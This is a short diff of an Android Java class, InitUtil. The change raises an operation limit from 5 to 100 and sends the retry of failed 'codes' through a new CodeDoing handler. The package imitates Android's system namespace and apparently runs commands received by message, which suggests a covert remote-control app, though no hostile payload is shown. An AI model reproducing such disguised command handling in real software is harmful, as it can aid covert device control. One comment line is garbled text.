@@ -10,11 +10,12 @@ import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.Code;
 import com.android.system.controled.bean.ConfigInfo;
 import com.android.system.controled.db.InnerDbOpera;
+import com.android.system.controled.logic.CodeDoing;
 import com.android.system.controled.service.ListenService;
 
 public class InitUtil {
 
-	private static final int MAX_OPERAS = 5;
+	private static final int MAX_OPERAS = 100;
 
 	/**
 	 * ≥ı ºªØªÚcheck
@@ -111,7 +112,7 @@ public class InitUtil {
 		}
 
 		for (Code code2 : codesFailedSelected) {
-			DoAboutCodeUtils.doOperaByMessage(context, "CODE." + code2.getCode(), code2);
+			CodeDoing.getInstance().doOperaByMessage(context, code2);
 		}
 	}
 }
